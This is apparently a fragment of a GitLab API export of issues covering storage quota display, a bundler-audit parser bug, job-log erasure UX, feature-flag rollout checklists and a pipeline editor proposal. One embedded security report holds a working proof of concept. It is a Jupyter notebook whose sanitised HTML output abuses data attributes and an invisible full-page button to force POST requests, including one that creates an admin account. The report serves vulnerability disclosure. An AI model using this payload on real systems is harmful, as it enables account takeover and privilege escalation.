Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":41,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347351","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347351","notes":"https://gitlab.com/api/v4/projects/278964/issues/347351/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347351/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347351","relative":"#347351","full":"gitlab-org/gitlab#347351"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7228,"epic":{"id":401185,"iid":7228,"title":"Project-level storage usage visibility for the Container Registry","url":"/groups/gitlab-org/-/epics/7228","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"at_risk"},{"id":98621458,"iid":347350,"project_id":278964,"title":"Surface deduplicated size of individual image repositories in the UI","description":"## Context\n\nWe are rolling out a new version of the Container Registry in GitLab.com that includes a metadata database (\u0026amp;5523).

takes a few seconds after Storage purchase to render the update amount of Storage correctly on the Usage Quotas tab. Thus most of the time a user sees a green notification that the storage is purchased but the number still shows 0.0 storage. Refresh of the page in a second will fix it.\n\n| Right after the purchase | Refresh after 1 second |\n| ------ | ------ |\n| ![Screenshot_2021-12-06_at_10.17.19](/uploads/c965e800e6108d9e097110f2b0b5edf6/Screenshot_2021-12-06_at_10.17.19.png) | ![Screenshot_2021-12-06_at_10.17.44](/uploads/d7b8e32cad30edf4634d853e21885711/Screenshot_2021-12-06_at_10.17.44.png) |\n\n## Proposal\n\nPossible solutions:\n\n1. Update notification text with:\n\n\u003e **Thanks for your purchase!**\n\u003e \n\u003e You have successfully purchased a storage subscription. You’ll receive a receipt by email. Your purchase may take a minute to sync, so refresh the page if you don't see it yet.\n\n2. Wait a bit longer with redirecting back (potentially a \\~1000 ms delay for a redirect)\n\n## Follow-up\n\nA more robust solution could be to use state for the UsageQuotas page, and update this state when we successfully send amend request to subscription (update the state on redirect). This option needs to be investigated further.

In the \"worst case\" an attacker could make an admin create a new admin account for the attacker. Other possible attack vectors are forcing invites to private projects etc. Every POST request is possible.\n\nThis research is loosely based on the issue with Rails Ujs data-* parameters. Nowadays DOMPurify strips Rails Ujs data- attributes such as data-url and data-method. What is not stripped is arbitrary data attributes. Looking through the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js , which is run on page load in the UI, I found multiple vectors still possible to abuse.\n\nThe script hooks up a lot of event listeners and modifications to the DOM. What is of particular interest for us is the part that is delayed to let additional data on the page load.\n\n```  \nfunction deferredInitialisation() {  \n  const $body = $('body');\n\n  initTopNav();  \n  initBreadcrumbs();  \n  initTodoToggle();  \n  initLogoAnimation();  \n  initServicePingConsent();  \n  initUserPopovers();  \n  initBroadcastNotifications();  \n  initPersistentUserCallouts();  \n  initDefaultTrackers();  \n  initFeatureHighlight();  \n```\n\nReading through the source files for these functions I managed to find multiple selector/data-attribute combinations that can be used even with purified HTML.\n\nAs an example we have persistent_user_callout in\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js\n\nwhere a POST request is made like\n\n```  \ndismiss(event, deferredLinkOptions = null) {  \n    event.preventDefault();\n\n    axios  \n      .post(this.dismissEndpoint, {  \n        feature_name: this.featureId,  \n      })  \n```\n\nthe `dissmissEndpoint` is controllable through a data attribute `data-dissmiss-endpoint`. The data attributes are extracted like so\n\n```  \nexport default class PersistentUserCallout {  \n  constructor(container, options = container.dataset) {  \n    const { dismissEndpoint, featureId, deferLinks } = options;  \n    this.container = container;  \n    this.dismissEndpoint = dismissEndpoint;  \n    this.featureId = featureId;  \n    this.deferLinks = parseBoolean(deferLinks);\n\n    this.init();  \n  }  \n```\n\nTo be able to fire the dismiss function (and thus the POST request) we also need a `js-close` button\n\n```  \nconst closeButton = this.container.querySelector('.js-close');  \n```\n\nThe HTML needed to set this up is\n\n```  \n\u003cdiv class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"\u003e  \n    \u003cbutton style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\"\u003e  \n        hack  \n    \u003c/button\u003e  \n\u003c/div\u003e  \n```\n\nThe styling is there to make the button as an invisible overlay over the whole page making it trigger on a click anywhere.\n\nNow to the attack. If an attacker creates a Jupyter Notebook there exists the possibility to add HTML in the output fields. This HTML will be sanitized by DOMPurify, but this will not stop the attack.\n\nA file like this will do as a simple POC\n\n```  \n{\n  \"cells\": [  \n    {  \n      \"metadata\": { \"trusted\": true },  \n      \"cell_type\": \"code\",  \n      \"source\": \"\u003ch1\u003easd\u003c/h1\u003e\",  \n      \"execution_count\": 1,  \n      \"outputs\": [  \n        {  \n          \"output_type\": \"display_data\",  \n          \"data\": {  \n            \"text/plain\": \"\u003cIPython.core.display.HTML object\u003e\",  \n            \"text/html\": \"\u003cdiv class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\"\u003easdf\u003c/div\u003e\\n\u003cdiv class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"\u003e\u003cbutton style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\"\u003ehack\u003c/button\u003e\u003c/div\u003e\\n\"  \n          },  \n          \"metadata\": {}  \n        }  \n      ]  \n    }  \n  ],  \n  \"metadata\": {  \n    \"kernelspec\": {  \n      \"name\": \"python3\",  \n      \"display_name\": \"Python 3\",  \n      \"language\": \"python\"  \n    },  \n    \"language_info\": {  \n      \"name\": \"python\",  \n      \"version\": \"3.7.8\",  \n      \"mimetype\": \"text/x-python\",  \n      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },  \n      \"pygments_lexer\": \"ipython3\",  \n      \"nbconvert_exporter\": \"python\",  \n      \"file_extension\": \".py\"  \n    }  \n  },  \n  \"nbformat\": 4,  \n  \"nbformat_minor\": 4  \n}\n```\n\nI have added a `feature-highlight` (another possible vector, see image) just to show when the attack is successful. As the main.js script is run with a timer, sometimes one has to refresh the page to have the payload \"load up\" (this could possibly be worked around). When the attack is loaded, the highlight div will turn into a blue dot.\n\n![dot.png](https://h1.sec.gitlab.net/a/ab401856-12df-4c47-ae6c-4cbbecbbea89/dot.png)\n\nVisiting this site and clicking anywhere will add a Todo on an Issue on one of my projects. I have also tested this attack with an attack creating an admin account. Replacing the payload in the POC with this one\n\n```  \n\"text/html\": \"\u003cdiv class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/users?admin=true\u0026email=joaxcarte01@wearehackerone.com\u0026name=just\u0026username=just\u0026password=asdasdasdasd\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"\u003e\u003cbutton style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\"\u003e.\u003c/button\u003e\u003c/div\u003e\\n\"}  \n```\n\nA visit by an admin to this site would end up with a new admin account being created.\n\nFinally I want to point out that this kind of attack is possible anywhere where HTML injection could happen. Even with Purified HTML.\n\n#####  Steps to reproduce  \n1. Create a project on GitLab.com  \n2.

reports incorrect, empty vulnerability","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nIn some cases, the bundler-audit analyzer reports a vulnerability whose fields are empty or have the default value. This happens when `bundle audit check` logs a warning message before listing the vulnerabilities or no vulnerabilities at all.\n\nThe empty vulnerability looks like the following: \n\n```json\n{\n      \"id\": \"85008fe3bf9c69f6acbc1b2f6f56b1540498ac7abcfc27f589ddd17357968c5f\",\n      \"category\": \"dependency_scanning\",\n      \"message\": \"Vulnerability in \",\n      \"cve\": \"Gemfile.lock:\",\n      \"severity\": \"Unknown\",\n      \"scanner\": {\n        \"id\": \"bundler_audit\",\n        \"name\": \"bundler-audit\"\n      },\n      \"location\": {\n        \"file\": \"Gemfile.lock\",\n        \"dependency\": {\n          \"package\": {}\n        }\n      },\n```\n\nHowever there are no vulnerabilities when running bundler-audit locally:\n\n```\n\u003e /performance - update-ruby-2.7.4: bundle-audit               \nNo vulnerabilities found\n```\n\n### Further details\n\nAs of today, bundler-audit is one of the two Dependency Scanning scanners capable of scanning bundler lock files. Technically, the analyzer is a wrapper that runs `bundle audit`, processes its text output, and generate a GitLab Dependency Scanning report. There's a bug in the text parser.\n\n### Steps to reproduce\n\n1. Create a GitLab project with [Gemfile](/uploads/ca89dbbcbdb7df7f04909df61c91d2de/Gemfile) and [Gemfile.lock](/uploads/9ee76192a3ec71a2839dbd5672d53d13/Gemfile.lock).\n1. Enable GitLab Dependency Scanning and run a CI pipeline.\n1. Check the CI artifact created by the `bundler-audit_dependency-scanning` job.\n\n### Sample project\n\n1. Open [GPT Security report](https://gitlab.com/gitlab-org/quality/performance/-/pipelines/423504957/security)\n2. Click on `Hide dismissed` and review Vulnerability.  - artifact for bundler [gl-dependency-scanning-report__4_.json](/uploads/19dff3b12fef0403c8e4dd4876af5743/gl-dependency-scanning-report__4_.json)\n\n\u003cdetails\u003e\n\u003csummary\u003eArtifact -

investigate the problem, try to reproduce and debug/fix if possible. \n\n### Possible fixes\n\nWe should either:\n- Fix the parser of the text output.\n  - Remove the warnings.\n  - Ignore everything until there's something that looks like a vulnerability section.\n- Use the JSON output bundler-audit.\n\nParsing the JSON output seems more reliable, and it's possibly less time consuming compared to making sense of a bug in the text parser.","state":"closed","created_at":"2021-12-06T16:25:46.601Z","updated_at":"2022-03-13T14:03:50.539Z","closed_at":"2022-03-01T07:27:32.984Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien

Currently in BETA, details on the **release post item generator** can be found in the handbook:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg. The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve \nInstead of deleting only the log artifact, the `Erase logs` button is removing [more than that](https://gitlab.com/gitlab-org/gitlab/-/blob/733ba47f419bffd0e0d02dcbc7e30d9f7d2f2283/app/models/ci/build.rb#L802-809). And this behavior is documented for the API counterpart: https://docs.gitlab.com/ee/api/jobs.html#erase-a-job\n\nHowever, on the UI it is not clearly communicated what the users should really be expecting when erasing job logs. \n\nA small change was made to add a hover tooltip to clarify in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75892 but placement should also be addressed.\n\n\u003c!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, \"As a (who), I want (what), so I can (why/value).\" --\u003e\n\n### Intended users\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager).

Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n### User experience goal\n\nUsers should be aware of what an action would result into. \nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/75892 does a good job at communicating to users about what all is deleted when they're clicking on the `Erase job logs` button. \n\n\n\u003c!-- What is the single user experience workflow this problem addresses?\nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e\n\n\n### Proposal\n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/347237/designs/erase-job-logs.png\n\n1. move delete button next to retry job button\n1. replace retry button with an icon button\n1. retain the tooltip on the erase button\n\n\nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/75892#note_753423489\n\u003c!-- How are we going to solve the problem?

Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document.

Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab ci_find_runners_by_ci_mirrors true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss ci_find_runners_by_ci_mirrors true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com ci_find_runners_by_ci_mirrors true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org ci_find_runners_by_ci_mirrors true`\n    - [ ] `/chatops run feature set --group=gitlab-com ci_find_runners_by_ci_mirrors true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e ci_find_runners_by_ci_mirrors true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set ci_find_runners_by_ci_mirrors \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set ci_find_runners_by_ci_mirrors \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set ci_find_runners_by_ci_mirrors true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_find_runners_by_ci_mirrors`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `ci_find_runners_by_ci_mirrors` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete ci_find_runners_by_ci_mirrors --dev`\n    - [x] `/chatops run feature delete ci_find_runners_by_ci_mirrors --staging`\n    - [x] `/chatops run feature delete ci_find_runners_by_ci_mirrors`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set ci_find_runners_by_ci_mirrors false\n```","state":"closed","created_at":"2021-12-06T13:52:45.651Z","updated_at":"2022-02-17T10:13:46.574Z","closed_at":"2022-02-17T10:13:46.552Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Engineering Allocation","[Deprecated] Category:Runner","backend","ci-decomposition","devops::verify","feature flag","feature::addition","group::runner","section::ops","type::feature","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347226","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":8},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347226","notes":"https://gitlab.com/api/v4/projects/278964/issues/347226/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347226/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347226","relative":"#347226","full":"gitlab-org/gitlab#347226"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6379,"epic":{"id":309971,"iid":6379,"title":"Decomposition: Make Ops features compatible with Decomposed CI database","url":"/groups/gitlab-org/-/epics/6379","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98526029,"iid":347224,"project_id":278964,"title":"Remove pipelines fields as deprecated in the package related GraphQL types","description":"Remove the `pipelines` field from the following ~GraphQL types:\n\n* `app/graphql/types/packages/package_type.rb`\n* `app/graphql/types/packages/package_details_type.rb`\n\nThis is step 6 of:\n\n1.

The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase.

In order to improve the authoring experience for new and novice users we would like to support them as they write or update their CI pipeline.\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem\n\nGitLab CI could be intimidating to technical and non-technical users. In order to work with GitLab CI users need to be familiar with YAML which is error-prone. In addition, GitLab CI is highly flexible but with this flexibility comes a level of complexity, there are many keywords and ways to implement Pipelines, and it's difficult to understand and remember the properties of different keywords.\n\nThe auto-complete functionality by itself is not enough, users would need to understand what each keyword is doing and should be able to quickly navigate into the relevant docs section.\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n\n#### User stories\n\nWhen writing a pipeline configuration and using different templates and examples I want to easily learn what different keywords do and how to use them.\n\n## Proposal\n\nAdd docs links to all keywords in the CI Schema so they show up in the on-hover tooltips in the pipeline editor.\n\n| |  |\n| ------ | ------ |\n| ![image](/uploads/f108d2901de5d40efe990794eba78f5c/image.png) | ![image](/uploads/0332a1356eafcdcade53e98bb4d98add/image.png) |\n\nThe \"Learn more\" link should open the appropriate section in the [keyword reference documentation. ](https://docs.gitlab.com/ee/ci/yaml/)\n\n#### :link: [Figma design specs](https://www.figma.com/file/O1iQx5kEr3UK1cTYu1qFnH/%F0%9F%92%9CPipeline-Editor?node-id=1811%3A53862)\n\n### Metrics \n\n\u003c!-- How are you going to track uage of this feature?

Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior.

